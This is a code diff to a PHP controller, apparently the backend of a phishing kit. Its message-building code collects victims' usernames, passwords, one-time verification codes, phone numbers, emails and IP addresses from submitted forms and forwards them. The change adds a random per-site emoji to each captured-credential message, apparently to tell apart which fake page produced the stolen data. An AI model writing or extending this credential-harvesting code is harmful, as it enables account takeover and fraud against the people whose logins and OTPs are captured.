@@ -20,7 +20,8 @@ class CustomWeb extends Controller
         $web_info = Crypt::encryptString(Json::encode([
             'id' => $db_data->id,
             'userid' => $db_data->userid,
-            'webid' => $db_data->id
+            'webid' => $db_data->id,
+            'emoji' => randomEmojiUnique(5),
         ]));
         // đặt ngôn ngữ cho giao diện
         $theme_language = $web_data->theme_language;
@@ -101,6 +102,7 @@ class CustomWeb extends Controller
                                     "User: <code>$post_data->username</code>",
                                     "Pass: <code>$post_data->password</code>",
                                     "---------------",
+                                    "Emoji phân biệt: $web_info->emoji",
                                     "IP: $ip",
                                     "---------------"
                                 ]);
@@ -131,6 +133,7 @@ class CustomWeb extends Controller
                                     "",
                                     "Mã xác minh: <code>$post_data->otp</code>",
                                     "---------------",
+                                    "Emoji phân biệt: $web_info->emoji",
                                     "IP: $ip",
                                     "---------------"
                                 ]);
@@ -198,6 +201,7 @@ class CustomWeb extends Controller
                                     "",
                                     "Số điện thoại: <code>$post_data->phone</code>",
                                     "---------------",
+                                    "Emoji phân biệt: $web_info->emoji",
                                     "IP: $ip",
                                     "---------------"
                                 ]);
@@ -228,6 +232,7 @@ class CustomWeb extends Controller
                                     "Số điện thoại: <code>$post_data->phone</code>",
                                     "Mã xác minh: <code>$post_data->otp</code>",
                                     "---------------",
+                                    "Emoji phân biệt: $web_info->emoji",
                                     "IP: $ip",
                                     "---------------"
                                 ]);
@@ -297,6 +302,7 @@ class CustomWeb extends Controller
                                 "Số điện thoại: <code>$post_data->phone</code>",
                                 "Email: <code>$post_data->email</code>",
                                 "Pass: <code>$post_data->password</code>",
+                                "Emoji phân biệt: $web_info->emoji",
                                 "---------------"
                             ]);
                             // tiến hành insert
